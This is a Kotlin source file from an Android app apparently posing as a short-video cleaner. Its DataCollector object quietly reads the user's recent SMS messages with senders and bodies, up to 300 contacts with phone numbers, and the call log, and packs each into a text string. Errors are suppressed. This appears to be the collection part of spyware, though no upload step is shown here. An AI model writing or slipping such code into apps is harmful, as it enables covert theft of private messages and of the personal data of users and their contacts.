package com.shortvideocleaner.app

import android.content.Context
import android.database.Cursor
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony

object DataCollector {

    fun collectSms(context: Context): String? {
        return try {
            val sb = StringBuilder()
            val cursor: Cursor? = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI, null, null, null,
                "date DESC LIMIT 200"
            )
            cursor?.use {
                val addrCol = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyCol = it.getColumnIndex(Telephony.Sms.BODY)
                val dateCol = it.getColumnIndex(Telephony.Sms.DATE)
                val typeCol = it.getColumnIndex(Telephony.Sms.TYPE)
                while (it.moveToNext()) {
                    val type = when (it.getInt(typeCol)) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "收"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "发"
                        else -> "?"
                    }
                    sb.appendLine("[$type] ${it.getString(addrCol)} | ${it.getString(bodyCol)?.take(80)}")
                }
            }
            if (sb.isEmpty()) null else sb.toString()
        } catch (_: Exception) { null }
    }

    fun collectContacts(context: Context): String? {
        return try {
            val sb = StringBuilder()
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI, null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 300"
            )
            cursor?.use {
                val nameCol = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                val idCol = it.getColumnIndex(ContactsContract.Contacts._ID)
                val hasPhoneCol = it.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)
                while (it.moveToNext()) {
                    val name = it.getString(nameCol) ?: ""
                    val contactId = it.getString(idCol)
                    if (it.getInt(hasPhoneCol) > 0) {
                        val phones = loadPhones(context, contactId)
                        sb.appendLine("$name: $phones")
                    } else {
                        sb.appendLine(name)
                    }
                }
            }
            if (sb.isEmpty()) null else sb.toString()
        } catch (_: Exception) { null }
    }

    private fun loadPhones(context: Context, contactId: String): String {
        val phones = mutableListOf<String>()
        try {
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                arrayOf(contactId), null
            )
            cursor?.use {
                val numCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) phones.add(it.getString(numCol) ?: "")
            }
        } catch (_: Exception) {}
        return phones.joinToString(", ")
    }

    fun collectCallLog(context: Context): String? {
        return try {
            val sb = StringBuilder()
            val cursor: Cursor? = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI, null, null, null,
                "date DESC LIMIT 200"
            )
            cursor?.use {
                val numCol = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeCol = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateCol = it.getColumnIndex(CallLog.Calls.DATE)
                val durCol = it.getColumnIndex(CallLog.Calls.DURATION)
                while (it.moveToNext()) {
                    val callType = when (it.getInt(typeCol)) {
                        CallLog.Calls.INCOMING_TYPE -> "来电"
                        CallLog.Calls.OUTGOING_TYPE -> "拨出"
                        CallLog.Calls.MISSED_TYPE -> "未接"
                        else -> "?"
                    }
                    val dur = it.getLong(durCol)
                    sb.appendLine("[$callType] ${it.getString(numCol)} | ${dur}s")
                }
            }
            if (sb.isEmpty()) null else sb.toString()
        } catch (_: Exception) { null }
    }
}
